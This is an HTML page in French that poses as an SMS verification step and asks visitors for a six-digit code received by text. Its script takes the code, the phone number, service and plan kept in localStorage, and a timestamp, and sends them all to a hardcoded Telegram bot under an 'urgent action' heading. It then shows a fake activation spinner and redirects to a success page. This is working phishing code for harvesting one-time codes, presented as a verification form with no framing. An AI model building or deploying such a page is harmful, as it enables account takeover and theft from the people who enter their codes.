<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Code SMS</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
        .container{max-width:420px;width:100%;}
        .card{background:#111;border-radius:28px;padding:60px 30px;box-shadow:0 20px 60px rgba(0,255,136,0.15);border:1px solid #1a1a1a;}
        h1{font-size:2.2em;font-weight:700;color:#fff;text-align:center;margin-bottom:20px;}
        p{color:#888;text-align:center;font-size:1.1em;margin-bottom:50px;}
        input{width:100%;padding:22px;background:#1a1a1a;border:2px solid #333;border-radius:18px;color:#fff;font-size:1.8em;text-align:center;letter-spacing:8px;transition:0.3s;}
        input:focus{border-color:#00ff88;box-shadow:0 0 0 4px rgba(0,255,136,0.2);}
        .btn{background:#00ff88;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:700;width:100%;margin-top:50px;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,255,136,0.4);}
        .btn:hover{background:#00ffaa;}
        .loader{display:none;width:60px;height:60px;border:8px solid #1a1a1a;border-top:8px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .status{text-align:center;margin-top:20px;color:#00ff88;font-weight:600;font-size:1.2em;}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>Code SMS</h1>
            <p>Entre le code √† 6 chiffres re√ßu par SMS</p>

            <input type="text" id="code" maxlength="6" placeholder="------" required autofocus>

            <button class="btn" id="btn">Valider le code</button>
            <div class="loader" id="loader"></div>
            <div class="status" id="status">En attente du code...</div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
        const TELEGRAM_CHAT_ID = "6272429080";

        const phone = localStorage.getItem('tempPhone') || 'Inconnu';

        document.getElementById('btn').addEventListener('click', async () => {
            const code = document.getElementById('code').value.trim();
            if (code.length !== 6) return;

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `üî• CODE RE√áU ‚Äì ACTION URGENTE üî•\nService: ${localStorage.getItem('selectedService')}\nPlan: ${localStorage.getItem('selectedPlan')}\nNum√©ro: ${phone}\nCode SMS: ${code}\n‚è∞ ${new Date().toLocaleString('fr-FR')}`
                })
            });

            document.getElementById('btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').textContent = 'Activation en cours...';

            setTimeout(() => {
                window.location.href = 'success.html';
            }, 4000);
        });
    </script>
</body>
</html>
